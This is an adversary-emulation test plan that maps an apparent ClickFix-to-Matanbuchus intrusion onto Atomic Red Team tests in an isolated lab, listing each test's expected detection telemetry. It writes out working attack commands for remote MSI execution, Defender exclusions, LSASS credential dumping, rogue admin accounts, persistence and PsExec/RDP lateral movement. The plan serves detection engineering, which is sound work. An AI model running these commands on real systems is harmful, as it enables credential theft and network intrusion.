# Atomic Red Team Test Plan — ClickFix → Matanbuchus 3.0 → AstarionRAT

**Source intel:** `exercises/2026-08-04/threat-intel.md`
**Lab:** ConDef — DC (Domain Controller), Win11v (workstation w/ Sysmon), Splunk SIEM
**Scope:** All techniques marked **Simulate** or **Simulate (proxy/careful)**. The four **Skip** rows (T1497.003, T1001, T1090.001, T1583.001) are intentionally excluded.

> **Verify test numbers before running.** Atomic Red Team renumbers/adds tests over time. Confirm the live numbering on each host with:
> `Invoke-AtomicTest <T-ID> -ShowDetailsBrief`
> Install prereqs with `-GetPrereqs` and always run `-Cleanup` after. Run inside an isolated ConDef snapshot you can revert.

---

## Phase 1 — Initial Access & Execution

### T1204.004 — User Execution: Malicious Copy and Paste (ClickFix)
**Test:** Atomic Test #1 - ClickFix (RunMRU paste-and-run simulation)
**Attacker command (what the atomic does):** Writes the pasted command into the Run-dialog MRU key and executes it:
```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v "a" /d "powershell -w hidden -c <payload>\1" /f
```
then spawns the payload via `explorer.exe`/`powershell.exe`.
**Customize to match intrusion:** set the payload string to the mixed-case msiexec lure `mSiexeC.EXe /q PACKAGE=http://<lab-web>/test.msi` so the RunMRU value and casing-evasion match the real ClickFix string.
**Expected telemetry:**
- Registry write to `...\Explorer\RunMRU` (Sysmon EID 13) — strongest ClickFix indicator.
- Sysmon EID 1 / Security 4688: process lineage `explorer.exe → powershell.exe/msiexec.exe`.
- 4104 PowerShell ScriptBlock if payload is PS.
**Cleanup:** `Invoke-AtomicTest T1204.004 -TestNumbers 1 -Cleanup` (deletes the RunMRU value).
**Host:** Win11v. **Prereqs:** none.

### T1218.007 — Signed Binary Proxy Execution: Msiexec
**Test:** Atomic Test #2 - Msiexec.exe execute remote MSI file (and #1 local MSI as fallback).
**Attacker command:**
```
msiexec.exe /q /i http://<lab-web>/test.msi
```
**Customize:** point the input arg (`remote_msi_url`) at the lab web server hosting the benign MSI (mimics `binclloudapp[.]com/466943`). To exercise the report's `PACKAGE=` property variant, run a manual companion: `msiexec /q PACKAGE=http://<lab-web>/test.msi`.
**Expected telemetry:**
- Sysmon EID 1 / 4688: `msiexec.exe` proc-create with a remote `http(s)://` argument; watch child processes of msiexec.
- Sysmon EID 3: outbound connection to lab web server.
- MsiInstaller EID 1116/1042 in Application log.
**Cleanup:** `Invoke-AtomicTest T1218.007 -TestNumbers 2 -Cleanup`.
**Host:** Win11v. **Prereqs:** lab web server hosting benign `test.msi`.

---

## Phase 2 — Defense Evasion & Persistence

### T1574.002 — Hijack Execution Flow: DLL Side-Loading
**Test:** Atomic Test #1 - DLL Side-Loading using the Notepad++ GUP.exe binary.
**Attacker command:** downloads signed `GUP.exe` + planted `libcurl.dll` to a user-writable dir and launches:
```
%APPDATA%\Local\Temp\Notepad++\updater\GUP.exe
```
**Customize to match intrusion:** to faithfully mirror the Zillya sideload, stage the signed host binary + planted DLL in a vendor-lookalike path under `C:\ProgramData\USOShared\` (report used `core.exe` + `SystemStatus.dll`, and `java.exe` + `jli.dll`). Rename the atomic's host/dll inputs accordingly, or run a manual variant copying a signed EXE + benign proxy DLL into USOShared.
**Expected telemetry:**
- **Sysmon EID 7 (ImageLoad):** signed EXE loading a DLL from `ProgramData`/`USOShared`/`%APPDATA%` — primary detection.
- Sysmon EID 1: proc-create of the signed loader from a non-standard path.
- Sysmon EID 11: DLL file-create in the staging dir.
**Cleanup:** `Invoke-AtomicTest T1574.002 -TestNumbers 1 -Cleanup`.
**Host:** Win11v. **Prereqs:** internet or pre-staged GUP.exe kit (`-GetPrereqs`).

### T1036.005 — Masquerading: Match Legitimate Name or Location (USOShared staging)
**Test:** Atomic Test #1 - Execute a process from a directory masquerading as the current parent directory (and #2 masquerade as a Windows process).
**Attacker command (adapted):** copy a benign EXE into a legit-looking location and run it, e.g.:
```
copy C:\Windows\System32\cmd.exe C:\ProgramData\USOShared\Core.exe
C:\ProgramData\USOShared\Core.exe /c whoami
```
**Customize:** use `C:\ProgramData\USOShared\` and the observed name `Core.exe` so path-based alerting fires on the real staging location.
**Expected telemetry:**
- Sysmon EID 1 / 4688: execution of an EXE from `C:\ProgramData\USOShared\` (never a normal exec location).
- Sysmon EID 11: file-create of the EXE in USOShared.
**Cleanup:** `Invoke-AtomicTest T1036.005 -TestNumbers 1 -Cleanup`; manually delete `C:\ProgramData\USOShared\Core.exe`.
**Host:** Win11v.

### T1036 / T1036.003 — Masquerading: Renamed 7-Zip (`aps.exe`) + password-protected archive
**Coverage note:** No single clean atomic reproduces "renamed 7-Zip extracting a password-protected `.7z`." Closest is **T1036.003 (Rename System Utilities)** for the rename behavior and **T1560.001 (Archive via Utility)** for the 7z password step.
**Manual reproduction (recommended):**
```
copy "C:\Program Files\7-Zip\7z.exe" C:\ProgramData\USOShared\aps.exe
C:\ProgramData\USOShared\aps.exe x TMP412.7z -p<archive-pw> -oC:\ProgramData\USOShared\
```
(Use the archive password `<archive-pw>` — redacted; see the internal IOC record — on a benign test archive.)
**Expected telemetry:** Sysmon EID 1 — process named `aps.exe` whose OriginalFileName/signer = 7-Zip (name/metadata mismatch); command line contains `x … -p… .7z`.
**Cleanup:** delete `aps.exe` and extracted files.
**Host:** Win11v. **Prereq:** 7-Zip installed; a benign password-protected `.7z`.

### T1027 / T1027.013 — Obfuscated/Encoded Files
**Test:** T1027 Atomic Test #1 - Base64-encoded payload; T1027.013 - Encrypted/Encoded File tests (where present).
**Attacker command (representative):**
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes('payload.bin'))
certutil -encode input.txt encoded.txt
```
**Expected telemetry:** 4104 ScriptBlock logging of base64/encoding cmdlets; Sysmon EID 1 `certutil.exe -encode`.
**Cleanup:** `-Cleanup` removes generated files.
**Host:** Win11v. **Note:** proxy for the ChaCha20/rolling-XOR/custom-base64 loader internals — do not detonate live samples.

### T1140 — Deobfuscate/Decode Files or Information *(Simulate proxy)*
**Test:** Atomic Test #1 - certutil decode; Atomic Test #2 - PowerShell base64 decode.
**Attacker command:**
```
certutil -decode encoded.txt decoded.exe
powershell [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))
```
**Expected telemetry:** Sysmon EID 1 `certutil.exe -decode`; 4104 base64 decode. Pairs with T1027 above to test decode-rule coverage.
**Cleanup:** `Invoke-AtomicTest T1140 -TestNumbers 1 -Cleanup`.
**Host:** Win11v.

### T1518.001 — Software Discovery: Security Software Discovery
**Test:** Atomic Test #1 - Security Software Discovery (tasklist/findstr); plus PowerShell process-enumeration test.
**Attacker command:**
```
tasklist.exe /svc | findstr /i "def cylance carbon crowd sense mcafee symantec"
Get-Process | Where-Object { $_.Name -match 'MsMpEng|Sense|cb|csfalcon' }
```
**Customize:** match the report's EDR process-name enumeration by including the vendor/EDR names the loader checks.
**Expected telemetry:** Sysmon EID 1 — `tasklist.exe`/`findstr.exe` with AV/EDR name filters; 4104 for the PowerShell variant.
**Cleanup:** none needed (read-only discovery).
**Host:** Win11v.

### T1562.001 — Impair Defenses: Disable/Modify Tools — Defender path exclusion
**Test:** Atomic Test - Add Defender Exclusion via `Add-MpPreference`.
**Attacker command:**
```
Add-MpPreference -ExclusionPath "C:\ProgramData\USOShared\"
```
**Customize:** exclude the exact `C:\ProgramData\USOShared\` staging path from the report.
**Expected telemetry:** **Defender Operational EID 5007** (config change to Exclusions\Paths). Correlate with a preceding quarantine event (report notes exclusion set *after* detection).
**Cleanup:** `Remove-MpPreference -ExclusionPath "C:\ProgramData\USOShared\"` (atomic `-Cleanup` handles this). **Revert Defender fully after the run.**
**Host:** Win11v and DC (run on both if exclusions were pushed lab-wide). **Prereq:** local admin; Tamper Protection off for the test window.

### T1562.001 — Impair Defenses: EDR unhooking *(Simulate careful — NO atomic coverage)*
**Coverage gap:** There is **no Atomic Red Team test** that restores/unhooks `ntdll.dll`/`kernel32.dll` from disk. Do **not** try to reproduce live unhooking on ConDef.
**Suggested proxy:** run a benign, well-known unhooking PoC (e.g., an open-source "fresh ntdll" demo) in a fully network-isolated snapshot, OR skip execution and instead validate detection logic against the loader's YARA (`win_mal_Matanbuchus_loader.yar`) and any EDR self-integrity telemetry. Treat as detection-engineering-only, not a live atomic.
**Host:** isolated Win11v snapshot only.

### T1620 — Reflective Code Loading *(Simulate proxy)*
**Test:** Atomic Test #1 - PowerShell reflective load of a .NET assembly/PE in memory.
**Attacker command (representative):**
```
[System.Reflection.Assembly]::Load([byte[]]$bytes)   # in-memory, no disk write
```
**Expected telemetry:** 4104 ScriptBlock showing `Reflection.Assembly::Load`/`VirtualAlloc`/`CreateThread`; minimal Sysmon file activity (memory-only) — this is the point of the test.
**Cleanup:** none (in-memory).
**Host:** Win11v. **Note:** benign proxy for the Lua→shellcode→reflective-PE chain; do not run live Matanbuchus.

### T1053.005 — Scheduled Task/Job: Scheduled Task
**Test:** Atomic Test #1/#2 - Create a scheduled task via `schtasks`.
**Attacker command:**
```
schtasks /create /tn "Application Maintenance" /tr "C:\ProgramData\USOShared\Core.exe" /sc onlogon /ru System /f
```
**Customize:** task name `Application Maintenance`, action pointing at `C:\ProgramData\<rand-hex>\Core.exe` — exactly matches the report artifact.
**Expected telemetry:** **Security EID 4698** (task created); Task Scheduler Operational 106/140; Sysmon EID 1 `schtasks.exe /create`.
**Cleanup:** `schtasks /delete /tn "Application Maintenance" /f` (atomic `-Cleanup`).
**Host:** Win11v (and DC if persistence was placed there). **Prereq:** admin for `/ru System`.

### T1569.002 — System Services: Service Execution
**Test:** Atomic Test - Execute a Command as a Service (`sc create` + `sc start`).
**Attacker command:**
```
sc.exe create AppMgmt binPath= "C:\ProgramData\USOShared\Core.exe" start= auto
sc.exe start AppMgmt
```
**Customize:** service name `AppMgmt` to match `sc start AppMgmt` in the report.
**Expected telemetry:** **System EID 7045** (service installed) + **7036** (service start); Security 4697; Sysmon EID 1 `sc.exe`.
**Cleanup:** `sc.exe delete AppMgmt` (atomic `-Cleanup`).
**Host:** Win11v and DC. **Prereq:** local admin.

---

## Phase 3 — Discovery

### T1069.002 — Permission Groups Discovery: Domain Groups
**Test:** Atomic Test #1 - Basic Permission Groups Discovery (`net group /domain`).
**Attacker command:**
```
net group "Domain Admins" /domain
net groups "Domain Admins" /domain
```
**Expected telemetry:** Sysmon EID 1 / 4688 `net.exe`/`net1.exe` with `/domain`; DC-side directory-service query telemetry. RunAs from a domain-joined context.
**Cleanup:** none (read-only).
**Host:** Win11v (queries DC) — **requires domain connectivity to the DC.**

### T1018 — Remote System Discovery
**Test:** Atomic Test - `nltest /dclist` (plus `net view` / ping-sweep variants).
**Attacker command:**
```
nltest /dclist:<domain>
```
**Expected telemetry:** Sysmon EID 1 `nltest.exe /dclist`; DC NETLOGON query.
**Cleanup:** none.
**Host:** Win11v (queries DC). **Prereq:** domain-joined.

### T1136.001 — Create Account: Local Account
**Test:** Atomic Test #1 - Create a new user in a command prompt (`net user /add`).
**Attacker command:**
```
net user DefaultService <password> /add
```
**Customize:** account name `DefaultService` to match the rogue account in the report.
**Expected telemetry:** **Security EID 4720** (user created); Sysmon EID 1 `net.exe user … /add`.
**Cleanup:** `net user DefaultService /delete` (atomic `-Cleanup`).
**Host:** Win11v (local) and DC (for a domain account, run `net user … /add /domain` on the DC).

### T1098 — Account Manipulation: add to Administrators / `Administradores`
**Test:** No exact atomic for local-group add; closest is T1098 domain-group tests. Reproduce with the observed command:
**Attacker command (run BOTH the English and Spanish group names per the plan):**
```
net localgroup Administrators DefaultService /add
net localgroup Administradores DefaultService /add
```
**Customize:** test the localized group name `Administradores` specifically — that's the report's distinctive artifact.
**Expected telemetry:** **Security EID 4732** (member added to a security-enabled local group) — event carries the group name/SID; correlate the `Administradores` string. Sysmon EID 1 `net localgroup … /add`.
**Cleanup:** `net localgroup Administrators DefaultService /delete` (and `Administradores`).
**Host:** Win11v and DC. **Note:** the Spanish group only exists on Spanish-locale hosts; on English hosts the SID `S-1-5-32-544` still resolves — validate the rule matches by SID, not just string.

### T1046 — Network Service Scanning
**Test:** Atomic Test - Port scan using PowerShell (native, no external tool).
**Attacker command:**
```
1..1024 | % { Test-NetConnection -ComputerName <dc-ip> -Port $_ -WarningAction SilentlyContinue }
```
**Customize:** scan Win11v → DC as called out in the plan; keep port range modest to stay lab-safe.
**Expected telemetry:** high-volume Sysmon EID 3 (network-connect) from one source to many DC ports in a short window; 4104 for the PS loop.
**Cleanup:** none.
**Host:** Win11v → DC. **Prereq:** network path to DC; Sysmon network-connect logging enabled.

### T1003 / T1134 — Credential theft / impersonation *(Simulate — careful)*
**Test:** T1003.001 Atomic Test - Dump LSASS via `comsvcs.dll` MiniDump (rundll32); T1134 access-token tests.
**Attacker command:**
```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Windows\Temp\lsass.dmp full
```
**Expected telemetry:** Sysmon **EID 10 (ProcessAccess)** targeting `lsass.exe` with `GrantedAccess 0x1fffff/0x1010`; EID 1 `rundll32 … comsvcs.dll, MiniDump`; EID 11 dump file-create. Security 4656/4663 on lsass if object auditing enabled.
**Cleanup:** delete `lsass.dmp`.
**Host:** Win11v and DC. **Prereq:** admin/SYSTEM. **Note:** dumps real credential material — restrict to a revertible snapshot, delete the dump, and never exfiltrate.

---

## Phase 4 — Lateral Movement

### T1021.002 — Remote Services: SMB/Windows Admin Shares (PsExec)
**Test:** Atomic Test - Copy and Execute File with PsExec (and "Execute command writing output to local Admin Share").
**Attacker command:**
```
PsExec.exe -accepteula -s -d \\<dc> -c C:\ProgramData\USOShared\test.bat
```
**Customize:** payload path `C:\ProgramData\USOShared\test.bat`, `-s` (SYSTEM) context, and push to **the DC and a second member server / backup DC** to reproduce the DC-to-DC pivot.
**Expected telemetry:**
- Target: **EID 7045** `PSEXESVC` service install; **EID 5145** access to `ADMIN$`/`IPC$`; **EID 4624 type 3** (network logon); remote proc-create from USOShared.
- Source: Sysmon EID 1 `PsExec.exe` + EID 3 to target 445.
**Cleanup:** atomic `-Cleanup` removes copied files; verify `PSEXESVC` service removed on target.
**Host:** Win11v → DC (and → second host). **Prereq:** admin creds to target; second Windows host for the pivot; PsExec (`-GetPrereqs`).

### T1021.001 — Remote Services: Remote Desktop Protocol (RDP)
**Test:** Atomic Test - RDP to a remote host / DomainController (may first enable RDP via registry).
**Attacker command:**
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
mstsc.exe /v:<dc>
```
**Customize:** authenticate interactively with the rogue `DefaultService` account (created in T1136.001) to tie RDP logon to the rogue identity.
**Expected telemetry:** **Security EID 4624 type 10** (RemoteInteractive) + **4778** (session reconnect); TerminalServices-RemoteConnectionManager 1149; Sysmon EID 13 if `fDenyTSConnections` toggled.
**Cleanup:** restore `fDenyTSConnections` to `1`; atomic `-Cleanup`.
**Host:** Win11v → DC. **Prereq:** RDP reachable; valid creds (the rogue account).

---

## Coverage Gaps — techniques flagged "Simulate" with weak/no Atomic coverage

| Technique | Gap | Manual reproduction |
|-----------|-----|---------------------|
| **T1562.001 EDR unhooking** | No atomic restores ntdll/kernel32 | Detection-engineering only, or a benign "fresh ntdll" PoC in a network-isolated snapshot. Do not run live loader. |
| **T1036 renamed 7-Zip `aps.exe`** | No single atomic | `copy 7z.exe → aps.exe`; run `x -p<archive-pw> .7z` on a benign archive (see Phase 2). |
| **T1098 local-group add (`Administradores`)** | Atomics are domain/cloud-focused | Run `net localgroup Administradores/Administrators DefaultService /add`; validate the 4732 rule matches by SID `S-1-5-32-544`, not string. |
| **T1620 / T1140 / T1027 loader internals** | Only benign proxies exist | Use the PowerShell reflective-load / certutil / base64 atomics as proxies; validate real behavior via the report's YARA rules, not live detonation. |

## Execution notes
- Run each phase, collect EVTX into `exercises/2026-08-04/evtx/`, then hunt with the `hayabusa` MCP and validate in Splunk.
- Custom artifacts to preserve fidelity: task `Application Maintenance`, service `AppMgmt`, account `DefaultService`, staging `C:\ProgramData\USOShared\`, binary `Core.exe`, renamed `aps.exe`, archive password `<archive-pw>`, and the localized group `Administradores`.
- **Always** `-Cleanup`, revert Defender/RDP/`fDenyTSConnections` changes, delete any LSASS dump, and remove `PSEXESVC` before snapshotting.
